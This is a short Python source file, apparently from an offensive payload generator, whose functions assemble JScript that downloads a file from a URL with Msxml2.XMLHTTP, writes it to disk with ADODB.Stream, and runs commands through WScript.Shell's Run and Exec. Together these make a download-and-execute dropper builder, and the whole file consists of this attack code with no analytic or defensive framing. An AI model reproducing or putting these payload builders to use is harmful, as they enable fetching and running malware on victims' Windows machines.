

def jscript_download(payload, url, path, comhttp="Msxml2.XMLHTTP"):

    if len(payload) != 0:
        payload += "\n"

    if not "sh" in payload:
        payload += "sh = new ActiveXObject(\"WScript.Shell\");\n"

    payload += "var path = sh.ExpandEnvironmentStrings(\"%s\").replace(/\\//g, \"\\\\\");" % path

    if not "http" in payload:
        payload += "\nvar http = new ActiveXObject(\"%s\");\n" % comhttp
    else:
        payload += "\n"
    payload += """http.Open("GET", "%s", false);
http.Send();
""" % url

    if not "stm" in payload:
        payload += "\nvar stm = new ActiveXObject(\"ADODB.Stream\");\n"
    else:
        payload += "\n"
    payload += """stm.Type = 1;
stm.Open();
stm.Write(http.responseBody);
stm.SaveToFile(path, 2);
stm.Close();
"""

    return payload



def jscript_WScriptShell_Run(payload, cmd):

    if len(payload) != 0:
        payload += "\n"

    if not "sh" in payload:
        payload += "sh = new ActiveXObject(\"WScript.Shell\");\n"

    if cmd.startswith("var:"):
        payload += "var quotedpath = \"\\\"\" + %s + \"\\\"\";\n" % cmd.split(':')[-1]
        payload += "sh[\"Run\"](quotedpath)"
    else:
        payload += "sh[\"Run\"](\"%s\")" % cmd

    return payload

def jscript_WScriptShell_Exec(payload, cmd, payload_args, word_list, strings):

    if len(payload) != 0:
        payload += "\n"

    if not "sh" in payload:
        payload += "sh = new ActiveXObject(\"WScript.Shell\");\n"

    if cmd.startswith("var:"):
        payload += "var quotedpath = \"\\\"\" + %s + \"\\\"\";\n" % cmd.split(':')[-1]
        payload += "sh[\"Exec\"](quotedpath)"
    else:
        payload += "sh[\"Exec\"](\"%s\")" % cmd

    return payload


